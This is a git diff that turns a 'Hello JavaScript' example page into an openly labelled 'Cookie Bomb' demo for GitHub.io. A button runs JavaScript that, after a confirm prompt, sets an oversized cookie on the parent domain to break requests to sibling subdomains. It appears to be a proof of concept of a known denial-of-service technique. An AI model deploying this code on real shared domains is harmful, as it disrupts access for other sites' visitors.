@@ -1,15 +1,23 @@
 <!DOCTYPE html>
 <html>
+<head>
+<script>
+function CookieBomb() {
+    var base_domain = document.domain.substr(document.domain.indexOf('.'));
+    var pollution = Array(4000).join('a');
+    if(confirm('Should I Cookie Bomb '+base_domain+'?')){
+    for(var i=1;i<2;i++){
+        document.cookie='bomb'+i+'='+pollution+';Domain='+base_domain;
+    }
+}
+}
+</script>
+</head>
 <body>
 
-<h2>Use JavaScript to Change Text</h2>
-<p>This example writes "Hello JavaScript!" into an HTML element with id="demo":</p>
+<h2>Demo Cookie Bomb GitHub.io</h2>
 
-<p id="demo"></p>
-
-<script>
-document.getElementById("demo").innerHTML = "Hello JavaScript!";
-</script> 
+<button type="button" onclick="CookieBomb()">Bomb me</button>
 
 </body>
-</html>
+</html> 
